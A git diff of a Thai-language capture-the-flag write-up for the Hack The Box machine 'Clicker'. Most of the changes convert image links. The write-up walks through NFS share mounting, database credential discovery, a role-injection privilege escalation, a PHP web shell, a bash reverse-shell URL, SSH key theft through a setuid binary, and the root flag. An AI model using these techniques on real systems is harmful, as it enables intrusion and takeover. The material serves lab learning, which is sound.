@@ -34,23 +34,21 @@ PORT      STATE SERVICE  VERSION
 50517/tcp open  status   1 (RPC #100024)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
 Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds
-
-```
 
 
 ## HTTP - TCP/80
 
 จากข้อมูลข้างต้นให้ลองเพิ่ม clicker.htb เข้าไป และทดสอบเข้าจะพบกับหน้าเว็บต่อไปนี้ 
 
-![[Challenge/HTB Challenge/Clicker/IMG/003.png]]
+![](./IMG/003.png)
 
 ให้ลอง Register และ Login จะพบกับหน้า play.php 
 
-![[Challenge/HTB Challenge/Clicker/IMG/004.png]]
+![](./IMG/004.png)
 
-![[Challenge/HTB Challenge/Clicker/IMG/005.png]]
+![](./IMG/005.png)
 
 
 ---
@@ -72,11 +70,11 @@ mkdir clicker-nfs
 sudo mount -t nfs 10.10.11.232:/ ./clicker-nfs -o nolock
 ```
 
-![[Challenge/HTB Challenge/Clicker/IMG/001.png]]
+![](./IMG/001.png)
 
 หลังจากที่ unzip มาแล้วจะพบว่ามีไฟล์ clicker.htb ซึ่งคาดว่าเป็นไฟล์สำหรับเว็บ Application ใน Port 80 โดยมีไฟล์ save_game.php ที่ดูน่าสนใจ
 
-![[Challenge/HTB Challenge/Clicker/IMG/002.png]]
+![](./IMG/002.png)
 
 สำรวจข้อมูลอื่นๆ 
 
@@ -87,19 +85,20 @@ session_start();
 include_once("db_utils.php");
 
 if ($_SESSION["ROLE"] != "Admin") {
-  header('Location: /index.php');
+  header('Location: /index.php
+');
   die;
 }
 ?>
 ```
 
 จากหน้านี้จะเห็นว่ามี role ที่ชื่อว่า admin และมีส่วนของการเรียกใช้ function ชื่อ get_top_players เพื่อดึงข้อมูลมาใส่ในตาราง ซึ่งอยู่ภายใน ==db_utils.php==  ที่มีการ include อยู่ด้านบน 
-![[Challenge/HTB Challenge/Clicker/IMG/006.png]]
+![](./IMG/006.png)
 
 
 หากเราไปเปิดไฟล์ db_util.php จะพบว่ามีฟังก์ชัน get_top_player มีการเรียกใช้ sql statement อยู่
 
-![[Challenge/HTB Challenge/Clicker/IMG/007.png]]
+![](./IMG/007.png)
 
 และที่สำคัญเราได้ข้อมูลของ user:pass ของ database ด้วย 
 
@@ -119,7 +118,7 @@ $pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_passwo
 session_start();
 include_once("db_utils.php");
 
-if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
+if (isset($_SESSION["PLAYER"]) && $_SESSION["PLAYER"] != "") {
 	$args = [];
 	foreach($_GET as $key=>$value) {
 		if (strtolower($key) === 'role') {
@@ -129,7 +128,7 @@ if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
 		}
 		$args[$key] = $value;
 	}
-	save_profile($_SESSION['PLAYER'], $_GET);
+	save_profile($_SESSION["PLAYER"], $_GET);
 	// update session info
 	$_SESSION['CLICKS'] = $_GET['clicks'];
 	$_SESSION['LEVEL'] = $_GET['level'];
@@ -177,20 +176,20 @@ UPDATE players SET clicks='4',level='0',role
 
 สังเกตจากตัวอย่างด้านบนคือ เราได้เว้รบรรทัดสำหรับหลีกเลี่ยงการตรวจจับ 
 
-![[Challenge/HTB Challenge/Clicker/IMG/009.png]]
+![](./IMG/009.png)
 
 จากนั้นให้ลอง logout และ login  ใหม่ จะพบว่ามีเมนู administrator ขึ้นมา 
-![[Challenge/HTB Challenge/Clicker/IMG/010.png]]
+![](./IMG/010.png)
 
 สำหรับหน้า admin portal เราจะสามารถ export ข้อมูลของ top player ได้ ซึ่งเมื่อเรากด export เราจะได้ข้อมูลของ url กลับมา 
 
-![[Challenge/HTB Challenge/Clicker/IMG/011.png]]
+![](./IMG/011.png)
 
-![[Challenge/HTB Challenge/Clicker/IMG/012.png]]
+![](./IMG/012.png)
 
 จากข้อมูลดังกล่าวแสดงให้เห็นว่ามีการสร้างไฟล์ใหม่ขึ้นมา อยู่ภายใต้ export ซึ่งหากเราไปดู Request จะพบว่ามีการส่ง extension เป็น txt แต่หากเราเปลี่ยนเป็น php ก็สามารถทำได้เช่นกัน 
 
-![[Challenge/HTB Challenge/Clicker/IMG/013.png]]
+![](./IMG/013.png)
 
 
 จากนั้นในหน้า save_profile.php เราจะพยายามแทรกโค็ด php ลงไปใน arg nickname 
@@ -199,13 +198,13 @@ UPDATE players SET clicks='4',level='0',role
 <?php system($_GET["cmd"]); ?>
 ```
 
-![[Challenge/HTB Challenge/Clicker/IMG/014.png]]
+![](./IMG/014.png)
 
 จากนั้น save บน export.php ไฟล์ php 
-![[Challenge/HTB Challenge/Clicker/IMG/015.png]]
+![](./IMG/015.png)
 
 ซึ่งหากเข้าผ่าน url แล้วตามด้วย cmd=id จะได้ข้อมูลดังต่อไปนี้ 
-![[Challenge/HTB Challenge/Clicker/IMG/016.png]]
+![](./IMG/016.png)
 
 ## Exploit to SHELL!
 
@@ -214,7 +213,7 @@ http://clicker.htb/exports/top_players_mvu1v3r0.php?cmd=bash%20-c%20%27bash%20-i
 ```
 
 เมื่อรันด้านบนเราจะได้รับ reverse shell กลับมา 
-![[Challenge/HTB Challenge/Clicker/IMG/017.png]]
+![](./IMG/017.png)
 
 ให้เราตรวจสอบไฟล์ที่น่าสนใจที่สามารถรันด้วยสิทธิของ jack ซึ่งจะพบว่ามีไฟล์ที่อยู่ภายใต้ /opt/manage ซึ่งมี execute_query อยู่ โดยหากเปิด README.txt ดูจะเห็นว่าเป็นโปรแกรมที่สามารถดำเนินการเกี่ยวกับฐานข้อมูล
 
@@ -346,7 +345,7 @@ LAB_001015e1:
 
 ```
 
-![[Challenge/HTB Challenge/Clicker/IMG/018.png]]
+![](./IMG/018.png)
 
 สิ่งที่น่าสนใจคือ switch case ในหัวข้อ default ที่มีการใช้ arg 2 ด้วย 
 
@@ -362,13 +361,14 @@ switch(iVar1) {
 ```
 
 ซึ่งหากเราทดสอบการใช้งาน 
-![[Challenge/HTB Challenge/Clicker/IMG/019.png]]
+![](./IMG/019.png)
 
 ## SSH to jack 
 
-และเนื่องจากว่าในโปรแกรมมีการเรียกใช้จาก path :  builtin_strncpy(local_98,"/home/jack/queries/",0x14); ซึ่งเราสามารถหาข้อมูลของ id_rsa ได้ 
+และเนื่องจากว่าในโปรแกรมมีการเรียกใช้จาก path :  builtin_strncpy(local_98,"/home/jack/queries/",0x14);
+ ซึ่งเราสามารถหาข้อมูลของ id_rsa ได้ 
 
-![[Challenge/HTB Challenge/Clicker/IMG/020.png]]
+![](./IMG/020.png)
 
 จากนั้นทำการแก้ไขไฟล์ id_rsa ที่ได้โดยเพิ่ม -- ทั้ง bigin และ end ในตอนท้าย และใช้คำสั่ง 
 ```bash
@@ -398,6 +398,7 @@ else
     timestamp=$(/usr/bin/date +%s)
     /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
 fi
+
 
 ```
 
@@ -497,10 +498,11 @@ root
 ice-5.1# cd /root
 ice-5.1# ls 
 diagnostic_files  restore  root.txt
-ice-5.1# cat root.txt
+nice-5.1# cat root.txt
 54b9eb675fb5c1b780da2c3c71c007f5
-ice-5.1# 
+nice-5.1# 
 ```
 
 
 # PWNED
+```
